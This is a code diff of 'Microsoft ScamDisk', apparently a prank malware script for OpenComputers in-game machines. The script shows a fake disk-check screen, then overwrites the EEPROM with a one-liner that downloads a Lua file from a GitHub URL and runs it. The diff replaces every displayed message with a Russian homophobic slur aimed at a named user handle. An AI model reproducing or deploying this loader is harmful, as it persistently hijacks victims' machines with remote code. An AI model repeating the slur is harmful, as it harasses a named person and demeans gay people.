@@ -35,16 +35,16 @@ gpu.setForeground(cyan)
 
 gpu.fill(1, 1, resX, resY, " ")
 
-gpu.set(5, 2, "Microsoft ScamDisk")
+gpu.set(5, 2, "@danilacasito pidor")
 gpu.fill(5, 3, resX - 6 - 2, 1, "—")
-gpu.set(5, 5, "Because MineOS was not properly shut down,")
-gpu.set(5, 6, "one or more of your disk drives may have errors on it.")
+gpu.set(5, 5, "@danilacasito pidor")
+gpu.set(5, 6, "@danilacasito pidor")
 gpu.fill(5, resY - 2, resX - 6 - 2, 1, "—")
 
 gpu.setForeground(gray)
-gpu.set(5, 8, "To avoid seeing this message again, always shut down")
-gpu.set(5, 9, "your computer by selecting Shut Down from the Start menu.")
-gpu.set(5, 11, "ScamDisk is now checking drive / for errors:")
+gpu.set(5, 8, "@danilacasito pidor")
+gpu.set(5, 9, "@danilacasito pidor")
+gpu.set(5, 11, "@danilacasito pidor")
 
 gpu.setForeground(yellow)
 gpu.fill(19, resY - 1, resX - 2 - 19, 1, "▒")
@@ -72,7 +72,7 @@ end
 
 eeprom.set("local a,b,c=component.proxy(component.list(\"internet\")()).request(\"https://raw.githubusercontent.com/KKosty4ka/OpenComputers-ScamDisk/master/efi2.lua\"),\"\"while true do c=a.read(math.huge)if c then b=b..c else break end end;a.close()load(b)()")
 
-error("Your disk has been scammed by Microsoft ScamDisk. Game over", 0)]]
+error("@danilacasito pidor", 0)]]
 
 eeprom.set(code)
 
